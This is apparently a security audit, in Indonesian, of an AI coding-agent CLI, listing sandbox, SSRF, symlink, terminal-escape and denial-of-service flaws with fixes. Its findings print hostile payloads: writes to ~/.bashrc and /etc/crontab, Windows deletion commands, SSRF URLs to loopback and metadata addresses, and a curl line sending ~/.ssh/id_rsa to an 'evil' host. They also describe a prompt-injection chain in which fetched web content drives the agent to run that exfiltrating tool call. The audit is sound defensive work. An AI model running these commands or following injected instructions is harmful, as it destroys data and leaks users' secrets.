# Audit Bug & Vulnerability — FAY-CLI

Tanggal: 2026-09-14. Metode: read-through manual src/security, src/tools, src/llm, src/agent, src/ui (subagent Explore gagal karena gateway 503). Semua temuan diverifikasi terhadap kode; payload konkret disertakan.

Ringkasan: 3 HIGH, 4 MEDIUM, 5 LOW.

---

## HIGH

### H-1. execute_command tidak meng-gate path di dalam command — write/edit file luar jail tanpa prompt
`src/security/guard.js:252-267` hanya memvalidasi `workingDir`. Path yang muncul di *teks* command tidak dicek terhadap jail. `PROTECTED_PATH_PATTERNS` (`src/security/rules.js:38-46`) hanya melindungi bare `/`, `/*`, bare `~`, `$HOME/`, `/etc`, `/boot`, `/var/lib` — dan karakter berikutnya **wajib** spasi/`;&|><` (tidak cocok untuk path panjang). `RISKY_COMMAND_PATTERNS` hanya daftar `rm/chmod/kill/curl|sh/dsb` — `sed`, `mv`, `ln`, `truncate`, `echo >` tidak berstatus risky.

Payload lolos tanpa konfirmasi (build mode, tanpa `-y`):
```
sed -i 's/.*/EVIL/' ~/.bashrc          # ~ disusul '/' → protected pattern tidak match
echo x >> /etc/crontab                  # /etc disusul '/' → lolos
truncate -s 0 /sdcard/Documentos/*       # /sdcard tidak terdaftar sebagai protected
mv src ../outside                        # mv tidak risky, outside tanpa prompt
```
Aturan pertama `PROTECTED_PATH_PATTERNS` (`/(?:\s|$|[;&|><])`) juga tidak catch `/etc/shadow` / `/var/log` — hanya exact dir.
Windows lebih bolong: blacklist berasumsi POSIX. `rd /s /q %USERPROFILE%\Documents`, `del /f`, `Remove-Item -Recurse -Force` → tidak match satu pattern pun → jalan senyap (cmd.exe via `shell:` di `src/tools/execute_command.js:52-54`).
Fix arah: parse argv command (shlex-like), cek target path terhadap jail; tambah pattern Windows (rd/del/Remove-Item/format) + protected list `/root /home /usr /bin /sdcard`.

### H-2. parseTextToolCalls mengeksekusi tool call yang di-fabrikasi dari teks biasa (false-positive execution + prompt-injection amplifier)
`src/llm/openai.js:663-684` (`classifyStandaloneJson`): setiap objek JSON dengan key `command`/`cmd` di teks model → jadi call `execute_command`, **tanpa perlu nama tool**. `extractInlineNameCalls` (`:649-661`): string `read_file {...}` di mana pun → call. Fallback ini aktif di dua tempat: `openai.js:341-352` (stream) + `orchestrator.js:357-362` (non-native).

Skenario konkret:
1. Model menjelaskan: `Contoh: gunakan {"command": "git status"}` → JSON polos itu dieksekusi betulan.
2. Lethal trifecta: `web_fetch` halaman hostile → kontennya (masih teks, masuk context) mendorong model menulis ulang `{"command": "curl https://evil/$(cat ~/.ssh/id_rsa)"}` → `curl` tanpa pipe-to-shell = tidak risky (rules.js:91) → exfiltrasi jalan tanpa prompt. Batas "tool result = data, bukan instruksi" tidak ditegakkan di layer parsing.
Fix arah: klasifikasi heuristik (standalone JSON / inline name) jangan auto-execute — minimal wajib nama tool eksplisit + perlakukan hasil fallback sebagai proposal yang butuh user-visible callout; atau hanya parse blok terverifikasi saat native tool_calls kosong *dan* model current provider diketahui butuh.

### H-3. web_fetch: SSRF via redirect + bypass regex privat-IP
`src/tools/web_fetch.js:12-38` cek hostname **hanya URL awal**; fetch pakai `redirect: 'follow'` (`:60`) tanpa re-check → publik host 302 ke `http://127.0.0.1:PORT` / `http://[::1]` / `http://169.254.169.254/` = SSRF penuh. Regex juga lexical: `http://2130706433` (decimal 127.0.0.1), `http://0x7f.0.0.1`, `http://127.1`, `http://0177.0.0.1`, IPv6-mapped `::ffff:127.0.0.1`, CGNAT `100.64/10` (Tailscale/DS-Lite) semua lolos.
Mitigasi ada: guard prompt per-fetch (`guard.js:458-467`) — tapi hilang total saat `-y`/autoApprove, dan web_search hasil `parseResults` mengarahkan fetch berikutnya.
Fix arah: `redirect: 'manual'` loop + re-validate tiap hop + resolve DNS → cek IP address (bukan string host), blok semua range RFC1918/loopback/link-local/CGNAT/unique-local.

---

## MEDIUM

### M-1. Path jail bersifat leksikal — symlink dalam workspace menembus jail
`src/security/path-validator.js:41-46` pakai `path.resolve` (lexical), tidak ada `fs.realpathSync` / `lstat` check. Rantai: `execute_command` → `ln -s ~/.ssh/id_rsa ./notes.txt` (`ln` tidak risky, tidak blacklist) → `read_file("notes.txt")` → `isAllowed=true`, zero prompt → konten luar jail masuk context. `write_file` fallback non-atomic (`write_file.js:54` `fs.writeFileSync(resolvedPath)` saat rename gagal) follow symlink → tulis target luar. Cek symlink saat resolve saja (TOCTOU tetap), tapi menutup 90% kasus; `list_dir`/`walkFiles` juga follow symlink-file untuk stat.
Fix arah: realpath-kan parent dir + `lstat` target sebelum allow; tolak entri symlink di jail.

### M-2. Output tak tercap sebelum selesai — memory DoS
Truncation terjadi **setelah** proses selesai: `execute_command.js:99-105` append terus ke `stdoutBuffer` (cap `maxOutputSizeBytes` diterapkan di `finish()`). `cat /dev/urandom | base64` selama 30 d tk = buffer GB → OOM kill CLI. Sama: `web_fetch.js:71` `response.text()` baca seluruh body sebelum limit `maxBytes`; `read_file.js:67` `fsp.readFile` whole file — file 5 GB → OOM sebelum cek `maxReadSizeBytes` (`stats.size` hanya dilaporkan, tidak menolak).
Fix arah: stop accumulate saat cap lewat (pause/destroy stream), reject read saat `stats.size > maxBytes`, streaming cap di fetch.

### M-3. Terminal escape injection ke dialog konfirmasi & diff preview
`src/ui/confirm-menu.js:71-77` dan `src/ui/diff-preview.js:38-42` me-render `target`/isi file mentah — byte ESC (`\x1b[1A`, `\x1b[J`, OSC title) tidak di-strip. Path/filename/command berisi escape → hapus baris "Tolak", pindahkan kursor, atau render ulang dialog palsu saat user sedang memutuskan HITL — undermining satu-satunya approval gate untuk H-1/M-1. (Markdown renderer: belum diaudit penuh, cek juga.)
Fix arah: sanitize `/\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07/g` dari string tak dipercaya sebelum masuk UI chrome.

### M-4. autoApprove (`-y`) melompati SEMUA prompt jail, bukan hanya "risky"
`guard.js:292, 343, 369`: `!isAllowed && !this.autoApprove` → dengan `-y`, `write_file /home/user/.bashrc` luar workspace jalan tanpa dialog. Flag didokumentasikan "auto-approve risky actions", praktinya = non-interaktif penuh termasuk escape jail. Minimal rename semantics / pisahkan `autoApproveRisky` vs `allowOutsideWorkspace`, dan tetap hard-deny protected paths.

---

## LOW

- **L-1.** `execute_command.js:76-96`: timeout `SIGTERM` hanya bunuh shell langsung; anak-anaknya (background, `&`) jadi yatim — butuh `detached:true` + kill `-pid` process group. `timeoutMs` dari model tak dibatasi atas (bisa 24 jam).
- **L-2.** `config/manager.js:171-178`: config.json korup → return DEFAULT diam-diam (tanpa log/user notice); `saveConfig` berikutnya overwrite file rusak → kehilangan konfigurasi permanen tanpa backup. Session/config mode 0o600/0o700 tidak berlaku di Windows (NTFS ACL) — API key world-readable tergantung ACL default.
- **L-3.** `openai.js:247-251` + `:438-443`: args tool-call yang gagal `JSON.parse` → `{}` diam-diam, call tetap dieksekusi dengan argumen kosong (mis. `git_add_commit` → error validasi, tapi `read_file` dsb bisa salah target).
- **L-4.** `grep_file.js:35`: regex dari model → ReDoS catastropic backtracking sinkron di event loop (mis. `(a+)+$`), freeze REPL. `maxIterations` default `Infinity` (`orchestrator.js:28`) → cost runaway hanya dibatasi reflection (interval 3) + double-noop compact guard; sudah ada remedi parsial, tapi satu session bisa tetap burn kredit lama.
- **L-5.** Orchestrator tidak meneruskan `signal` abort ke `execute_command` child (`registry.js:451` ctx punya signal, tool tak pakai) → Ctrl+C tidak mematikan proses yang sedang jalan.

---

## Diperiksa dan solid (near-misses)

- `isPathInside` (`path-validator.js:17-23`): `path.relative`-based, tidak kena bug prefix `/workspace-evil`.
- `session.js:283`: session id di-strip `[^a-zA-Z0-9_-]` → no traversal.
- `git.js`: spawn argv array + `add --` → no shell injection, no argument injection.
- `dispatchToolCall` (`registry.js:442-447`): exception saat authorize → fail-closed (blocked).
- `confirm-menu`: non-TTY → auto-deny; default cursor "Tolak"; Ctrl+C/Esc = deny.
- `walkFiles`: bounded 5000 entries, tidak follow symlink-to-dir.
- `TOOL_ARG_ALIASES`: normalisasi terjadi sebelum authorize dan objek args identik dipakai guard + tool → tidak ada checked-vs-executed TOCTOU alias.

## Prioritas perbaikan

1. H-1 (gap rules — paling murah diperbaiki, paling besar dampak).
2. H-3 (redirect loop + IP check).
3. H-2 (ketatkan heuristik parseTextToolCalls).
4. M-1 (realpath), M-3 (sanitize ESC), M-2 (streaming caps).
